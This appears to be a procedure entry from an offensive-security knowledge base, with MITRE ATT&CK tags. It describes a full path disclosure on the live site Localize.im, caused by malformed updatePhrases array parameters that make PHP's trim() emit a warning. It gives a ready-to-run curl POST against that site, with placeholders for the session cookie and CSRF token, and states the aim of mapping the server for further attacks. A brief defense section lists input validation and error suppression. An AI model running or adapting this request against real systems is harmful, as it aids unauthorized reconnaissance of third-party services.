---
id: proc-craft-post-001
tags:
  - fpd
  - malformed-input
  - php-error
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-post-malformed]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:12.031Z'
skill_level: beginner
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malformed-POST-Request-for-FPD

## Summary

This procedure crafts and submits a POST request with malformed updatePhrases parameters to the Localize.im endpoint, triggering a PHP trim() error that leads to path disclosure.

## Description

The vulnerability arises when appending '[]' to parameters in the updatePhrases array creates unexpected array structures, causing the trim() function to receive an array instead of a string, resulting in a warning that discloses the server path.

## Requirements

1. Valid CSRF token from the session
2. Authenticated cookie
3. Project and language IDs
4. Tool for sending POST requests like curl

## Defense

Defensive measures and detection strategies:

- Input validation to ensure parameters are strings, not arrays
- Error handling to suppress path disclosure in production
- Web Application Firewall (WAF) rules for malformed array inputs

## Objectives

1. Trigger PHP warning via invalid input type
2. Induce information disclosure
3. Map server environment for further attacks

## Instructions

### Step 1: Prepare Malformed Payload

**Context**: Construct the POST data with appended '[]' to parameters.

**Command** ([[commands/curl-post-malformed]]):
```bash
# No direct command; prepare data manually or via script
```

> Define payload: CSRFToken=TOKEN&updatePhrases[previous][yxr][0]=&...&updatePhrases[edit][someID][0][]=

### Step 2: Submit POST Request

**Context**: Send the request to exploit the vulnerability.

**Command** ([[commands/curl-post-malformed]]):
```bash
curl -X POST "https://www.localize.im/projects/[project ID]/languages/[Language ID]" \
  -H "Cookie: session=your_session_cookie" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "CSRFToken=TOKEN&updatePhrases[previous][yxr][0]=&updatePhrases[edits][yy4][0]=&updatePhrases[edits][yxr][0]=&updatePhrases[previous][yxq][0]=&updatePhrases[secret]=[SecretCodes]&updatePhrases[translatorID]=[ID]&updatePhrases[edit][someID][0][]="
```

> Expected output: Response with PHP warning including server path.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-post-malformed]]

## Tools Used

- [[tools/curl]]

## Tags

- [[fpd]]
- [[malformed-input]]
